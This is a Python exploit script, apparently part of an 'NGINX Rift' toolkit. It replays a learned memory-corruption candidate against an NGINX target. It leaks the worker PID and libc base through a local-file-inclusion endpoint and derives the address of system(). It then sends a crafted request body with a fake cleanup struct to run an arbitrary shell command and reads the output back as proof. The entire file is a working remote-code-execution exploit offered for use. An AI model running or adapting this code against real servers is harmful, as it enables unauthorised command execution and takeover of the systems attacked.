#!/usr/bin/env python3
"""Replay a candidate learned from a clone without reading target memory/core."""

from __future__ import annotations

import argparse
import secrets
import shlex
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import nginx_rifter as rifter
import poc


def make_target(args: argparse.Namespace) -> rifter.RifterTarget:
    host, port = rifter.parse_target(args.target, args.port)
    return rifter.RifterTarget(
        host,
        port,
        scheme="http",
        endpoint=args.lfi_endpoint,
        file_param=args.file_param,
        offset_param=args.offset_param,
        length_param=args.length_param,
        phpinfo_path="",
        timeout=args.timeout,
    )


def derive_system_addr(target: rifter.RifterTarget, args: argparse.Namespace) -> int:
    facts, _php_uid, _master_pid = rifter.find_worker(target, args.max_pid, args.pid_file)
    _system_offset, system_addr = rifter.derive_system(target, facts.libc_path, facts.libc_base)
    print(f"derived target worker pid: {facts.worker_pid}")
    print(f"derived target libc base:  {facts.libc_base:#x}")
    print(f"derived target system():   {system_addr:#x}")
    return system_addr


def read_marker(target: rifter.RifterTarget, marker: str) -> str:
    try:
        return target.lfi_text(marker, timeout=3)
    except Exception:
        return ""


def run(args: argparse.Namespace) -> int:
    host, port = rifter.parse_target(args.target, args.port)
    target = make_target(args)
    learned_addr = rifter.parse_addr(args.address)
    system_addr = rifter.parse_addr(args.system_addr) if args.system_addr else derive_system_addr(target, args)
    marker = args.marker or f"/tmp/rift_replay_{secrets.token_hex(6)}"
    token = secrets.token_hex(16)
    inner = f"{args.cmd}; rc=$?; echo __NGINX_RIFT_TOKEN__={token}; echo __NGINX_RIFT_RC__=$rc"
    capture_cmd = f"sh -c {shlex.quote(inner)} > {shlex.quote(marker)} 2>&1"
    body = poc.make_body_at_offset(capture_cmd, learned_addr, system_addr, args.slot_offset)

    print(f"target:          {host}:{port}")
    print("memory oracle:   none on target")
    print(f"learned address: {learned_addr:#x}")
    print(f"slot offset:     {args.slot_offset}")
    print(f"system():        {system_addr:#x}")
    print(f"marker:          {marker}")
    print(f"command:         {args.cmd}")
    print()

    if not poc.wait_alive(host, port, timeout=20):
        print("target is not responding", file=sys.stderr)
        return 2

    crashed = poc.attempt(
        host,
        port,
        rifter.low_bytes(learned_addr, args.target_len),
        body,
        h2_victim=True,
        a_count=args.a_count,
        plus_count=args.plus_count,
    )
    time.sleep(args.proof_delay)
    marker_text = read_marker(target, marker)

    print(f"worker disruption: {crashed}")
    if token not in marker_text:
        print("proof: failed")
        if marker_text:
            print(marker_text)
        return 1

    print("proof: success")
    print()
    for line in marker_text.splitlines():
        if line.startswith("__NGINX_RIFT_TOKEN__=") or line.startswith("__NGINX_RIFT_RC__="):
            continue
        print(line)
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Replay a clone-learned NGINX Rift candidate against a target."
    )
    parser.add_argument("--target", default=rifter.DEFAULT_TARGET)
    parser.add_argument("--port", type=int, default=19321)
    parser.add_argument("--address", required=True, help="learned fake-cleanup address")
    parser.add_argument("--slot-offset", type=int, required=True, help="body offset for fake cleanup struct")
    parser.add_argument("--system-addr", help="absolute target system(); derived from LFI maps/libc if omitted")
    parser.add_argument("--cmd", default="id")
    parser.add_argument("--target-len", type=int, default=6)
    parser.add_argument("--a-count", type=int, default=rifter.DEFAULT_A_COUNT)
    parser.add_argument("--plus-count", type=int, default=rifter.DEFAULT_PLUS_COUNT)
    parser.add_argument("--proof-delay", type=float, default=0.35)
    parser.add_argument("--marker")
    parser.add_argument("--lfi-endpoint", default="/lfi.php")
    parser.add_argument("--file-param", default="file")
    parser.add_argument("--offset-param", default="offset")
    parser.add_argument("--length-param", default="length")
    parser.add_argument("--pid-file", action="append", default=list(rifter.DEFAULT_PID_FILES))
    parser.add_argument("--max-pid", type=int, default=4096)
    parser.add_argument("--timeout", type=float, default=5)
    return parser


if __name__ == "__main__":
    raise SystemExit(run(build_parser().parse_args()))
